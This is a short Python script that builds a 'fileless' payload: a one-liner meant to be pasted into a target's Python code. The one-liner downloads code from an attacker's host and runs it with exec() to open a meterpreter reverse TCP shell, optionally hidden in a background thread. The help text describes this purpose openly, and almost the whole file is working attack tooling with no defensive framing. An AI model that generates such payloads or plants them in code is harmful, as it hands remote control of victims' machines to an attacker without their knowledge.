import argparse
HELP_MESSAGE = """
This script generates a fileless payload that can be used to execute a meterpreter reverse_tcp payload on a target machine.
The generated code should be pasted in the target python code.

Example:
python3 fileless_generator.py <IP> <PORT> [-a] [-t]

Arguments:
<IP>: IP address of the attacker machine.
<PORT>: Port number to listen on.
-a or --admin: Include admin feature code.
-t or --threading: Include threading code.
-h or --help: Show this help message.
"""
parser = argparse.ArgumentParser(description='Generate a fileless payload.', epilog=HELP_MESSAGE, formatter_class=argparse.RawDescriptionHelpFormatter)
parser.add_argument('ip', type=str, help='IP address')
parser.add_argument('port', type=int, help='Port number')
parser.add_argument('-a', '--admin', action='store_true', help='Include admin path')
parser.add_argument('-t', '--threading', action='store_true', help='Include threading')


args = parser.parse_args()

admin_path = "/admin" if args.admin else ""
command = ""
command += "import urllib.request, json\n"
if args.threading:
    command += "import threading\nthreading.Thread(target=lambda: "
command += f"""exec(urllib.request.urlopen(urllib.request.Request("http://{args.ip}:1500/python/meterpreter/reverse_tcp{admin_path}", data=json.dumps({{"LHOST": "{args.ip}", "LPORT": {args.port}}}).encode(), headers={{'Content-Type': 'application/json'}})).read().decode())"""
if args.threading:
    command += ").start()"
print("Copy the following code and paste it in the target python code:")
print("================================================================")
print(command)